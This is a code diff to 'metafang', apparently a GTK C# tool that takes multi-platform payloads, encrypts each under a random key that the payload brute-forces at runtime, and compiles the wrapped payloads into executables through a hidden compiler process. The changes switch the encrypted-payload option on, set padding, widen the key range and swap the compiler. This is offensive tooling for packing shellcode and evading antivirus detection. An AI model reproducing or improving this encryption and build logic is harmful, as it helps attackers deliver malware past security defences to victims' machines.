@@ -25,6 +25,8 @@ public partial class MainWindow: Gtk.Window
 
 	public MainWindow () : base (Gtk.WindowType.Toplevel)
 	{
+		_algorithm.Padding = PaddingMode.None;
+
 		this.Resize (600, 100);
 		this.Title = "metafang";
 		_main = new VBox ();
@@ -105,7 +107,7 @@ public partial class MainWindow: Gtk.Window
 		HBox buttons = new HBox ();
 
 		_encrypted.TooltipText = "Encrypted payloads will be bruteforced at runtime";
-		//buttons.PackStart (_encrypted, false, false, 0);
+		buttons.PackStart (_encrypted, false, false, 0);
 
 		Button generate = new Button ("Generate");
 
@@ -178,7 +180,6 @@ public partial class MainWindow: Gtk.Window
 				//Console.WriteLine (linx86Payload);
 
 			} else {
-
 				byte[] parity = new byte[4];
 				for (int i = 0; i < 4; i++)
 					parity [i] = Convert.ToByte (Convert.ToInt32 (Math.Floor (26 * _random.NextDouble () + 65))); 
@@ -209,7 +210,7 @@ public partial class MainWindow: Gtk.Window
 						for (int i = 4; i < b.Length; i++)
 							encb [i] = b [i - 4];
 
-						linx86Payload += GetByteArrayString (EncryptData (encb, _random.Next (1023).ToString ()));
+						linx86Payload += GetByteArrayString (EncryptData (encb, _random.Next (1024).ToString ()));
 					} else if (pair.Key.StartsWith ("linux/x64") || pair.Key.StartsWith ("osx/x64")) {
 						byte[] b = response ["payload"] as byte[];
 						byte[] encb = new byte[b.Length + 4];
@@ -220,7 +221,7 @@ public partial class MainWindow: Gtk.Window
 
 						for (int i = 4; i < b.Length; i++)
 							encb [i] = b [i - 4];
-						linx64Payload += GetByteArrayString (EncryptData (encb, _random.Next (1023).ToString ()));
+						linx64Payload += GetByteArrayString (EncryptData (encb, _random.Next (1024).ToString ()));
 					} else if (pair.Key.StartsWith ("windows/x64")) {
 						byte[] b = response ["payload"] as byte[];
 						byte[] encb = new byte[b.Length + 4];
@@ -231,7 +232,7 @@ public partial class MainWindow: Gtk.Window
 
 						for (int i = 4; i < b.Length; i++)
 							encb [i] = b [i - 4];
-						winx64Payload += GetByteArrayString (EncryptData (encb, _random.Next (1023).ToString ()));
+						winx64Payload += GetByteArrayString (EncryptData (encb, _random.Next (1024).ToString ()));
 					} else { /*windows x86*/
 						byte[] b = response ["payload"] as byte[];
 						byte[] encb = new byte[b.Length + 4];
@@ -242,7 +243,7 @@ public partial class MainWindow: Gtk.Window
 
 						for (int i = 4; i < b.Length; i++)
 							encb [i] = b [i - 4];
-						winx86Payload += GetByteArrayString (EncryptData (encb, _random.Next (1023).ToString ()));
+						winx86Payload += GetByteArrayString (EncryptData (encb, _random.Next (1024).ToString ()));
 					}
 				}
 
@@ -284,7 +285,7 @@ public partial class MainWindow: Gtk.Window
 		System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo ();
 
 		startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-		startInfo.FileName = "gmcs";
+		startInfo.FileName = "dmcs";
 		startInfo.Arguments = System.IO.Path.GetTempPath () + uid.ToString ();
 
 		process.StartInfo = startInfo;
